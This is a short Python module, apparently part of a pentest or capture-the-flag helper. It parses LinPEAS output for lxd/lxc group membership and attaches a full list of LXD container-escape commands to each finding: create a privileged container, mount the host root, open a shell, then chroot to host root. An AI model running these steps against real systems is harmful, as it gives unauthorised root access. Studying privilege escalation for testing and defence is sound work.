"""Detect lxd/lxc group membership for LXD container escape from LinPEAS output."""

import re
from typing import Dict, List

_ID_GROUPS_RE = re.compile(r"groups=([^\s]+)", re.IGNORECASE)
_GROUP_NAME_RE = re.compile(r"\d+\(([^)]+)\)")

_LXD_GROUPS = {"lxd", "lxc"}


def parse_lxd_section(section_text: str) -> List[str]:
    """Extract lxd/lxc group names from LinPEAS group output."""
    found: List[str] = []
    seen: set = set()
    for line in section_text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        m = _ID_GROUPS_RE.search(line)
        if m:
            for name in _GROUP_NAME_RE.findall(m.group(1)):
                if name.lower() in _LXD_GROUPS and name not in seen:
                    seen.add(name)
                    found.append(name)
    return found


def generate_commands(group: str) -> List[str]:
    """Generate LXD container escape exploit steps."""
    return [
        "# If lxd is not initialized yet: lxd init --auto",
        "lxc image import /path/to/alpine.tar.gz --alias pwn 2>/dev/null || lxc image list  # use existing image",
        "lxc init pwn privesc -c security.privileged=true 2>/dev/null",
        "lxc config device add privesc host-root disk source=/ path=/r recursive=true",
        "lxc start privesc",
        "lxc exec privesc -- /bin/sh",
        "# Inside container: chroot /r /bin/bash  -> root shell on host filesystem",
        "# Offline image builder: github.com/saghul/lxd-alpine-builder",
    ]


def analyze(section_text: str) -> List[Dict]:
    """Analyze LinPEAS output for lxd/lxc group membership.

    Returns a CRITICAL finding for each lxd/lxc group detected.
    """
    findings: List[Dict] = []
    for group in parse_lxd_section(section_text):
        findings.append({
            "group_name": group,
            "severity": "CRITICAL",
            "type": "lxd_group",
            "description": f"current user is in {group} group — LXD container escape to root",
            "commands": generate_commands(group),
        })
    return findings


# ── CLI self-test ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    SAMPLE = "uid=1000(ctf) gid=1000(ctf) groups=1000(ctf),108(lxd)\n"
    print("=== parse_lxd_section ===")
    print(parse_lxd_section(SAMPLE))
    print("\n=== analyze ===")
    for f in analyze(SAMPLE):
        print(f"[{f['severity']}] {f['type']} -> {f['description']}")
        print(f"  TRY FIRST: $ {f['commands'][0]}")
